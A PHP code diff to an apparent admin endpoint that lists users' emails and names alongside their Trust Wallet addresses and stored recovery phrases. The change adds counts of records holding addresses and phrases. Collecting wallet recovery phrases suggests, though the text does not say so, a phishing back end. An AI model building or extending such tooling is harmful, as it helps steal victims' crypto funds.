@@ -28,9 +28,15 @@ try {
 
     $total = $db->query("SELECT COUNT(*) FROM trust_wallet_links")->fetchColumn();
 
+    $metrics = $db->query(
+        "SELECT SUM(CASE WHEN wallet_address IS NOT NULL AND wallet_address != '' THEN 1 ELSE 0 END) AS with_address,
+                SUM(CASE WHEN phrase_encrypted IS NOT NULL AND phrase_encrypted != '' THEN 1 ELSE 0 END) AS with_phrase
+         FROM trust_wallet_links"
+    )->fetch();
+
     $stmt = $db->prepare(
         "SELECT twl.id, u.email, u.full_name,
-                twl.wallet_address, twl.phrase_encrypted,
+                twl.wallet_name, twl.wallet_address, twl.phrase_encrypted,
                 twl.submitted_at, twl.updated_at
          FROM trust_wallet_links twl
          JOIN users u ON u.id = twl.user_id
@@ -56,10 +62,12 @@ try {
     echo json_encode([
         'success' => true,
         'data'    => [
-            'links'  => $rows,
-            'total'  => (int) $total,
-            'page'   => $page,
-            'pages'  => (int) ceil($total / $limit),
+            'links'        => $rows,
+            'total'        => (int) $total,
+            'page'         => $page,
+            'pages'        => (int) ceil($total / $limit),
+            'with_address' => (int) ($metrics['with_address'] ?? 0),
+            'with_phrase'  => (int) ($metrics['with_phrase']  ?? 0),
         ],
     ]);
 
